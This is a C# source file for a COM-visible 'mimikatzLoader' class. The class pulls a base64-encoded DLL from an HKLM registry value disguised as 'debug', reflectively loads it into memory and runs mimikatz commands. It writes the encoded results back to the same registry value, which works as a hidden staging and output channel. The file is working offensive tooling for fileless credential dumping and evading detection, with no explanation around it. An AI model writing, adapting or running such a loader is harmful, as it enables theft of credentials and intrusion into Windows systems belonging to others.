using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using DllLoader;
using Microsoft.Win32;


[ComVisible(true)]
public class mimikatzLoader
{
    public mimikatzLoader()
    {

    }

    public void mimikatz(string command, string key)
    {
        RegistryKey hklm = Registry.LocalMachine;
        RegistryKey resultKey;
        if ((resultKey = hklm.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree)) == null)
            System.Environment.Exit(0);

        string encDll = (string)resultKey.GetValue("debug");
        resultKey.SetValue("debug", "");
        byte[] dll = Convert.FromBase64String(encDll);
        IntPtr result = Load.LoadPE(dll);

        IntPtr output;
        IntPtr input = Marshal.StringToHGlobalUni(command);

        if (result != IntPtr.Zero)
        {
            m mimikatz = (m)Marshal.GetDelegateForFunctionPointer(result, typeof(m));
            output = mimikatz(input);
            string results = Marshal.PtrToStringUni(output);
            
            string encResults = Convert.ToBase64String(Encoding.ASCII.GetBytes(results));
            resultKey.SetValue("debug", encResults, RegistryValueKind.String);
#if DEBUG
            Console.Write(results);
#endif
        }
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr m(IntPtr command);
}



